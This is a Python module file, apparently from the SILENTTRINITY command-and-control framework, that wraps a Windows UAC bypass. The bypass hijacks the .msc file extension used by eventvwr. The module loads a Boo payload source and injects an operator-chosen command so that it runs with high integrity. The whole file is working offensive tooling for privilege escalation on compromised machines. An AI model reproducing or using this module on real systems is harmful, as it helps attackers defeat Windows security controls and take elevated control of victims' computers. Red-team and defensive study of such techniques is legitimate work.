from silenttrinity.core.utils import get_path_in_package
from silenttrinity.core.teamserver.module import Module


class STModule(Module):
    def __init__(self):
        self.name = 'boo/uaceventvwr'
        self.language = 'boo'
        self.description = 'Bypasses UAC by performing an image hijack on the .msc file extension'
        self.author = '@enigma0x3, @byt3bl33d3r'
        self.references = []
        self.options = {
            'Command': {
                'Description': 'The command to execute with high integrity.',
                'Required': True,
                'Value': ""
            }
        }

    def payload(self):
        with open(get_path_in_package('core/teamserver/modules/boo/src/bypassUACEventVwr.boo'), 'r') as module_src:
            src = module_src.read()
            src = src.replace('PAYLOAD', str(self.options['Command']['Value']))
            return src
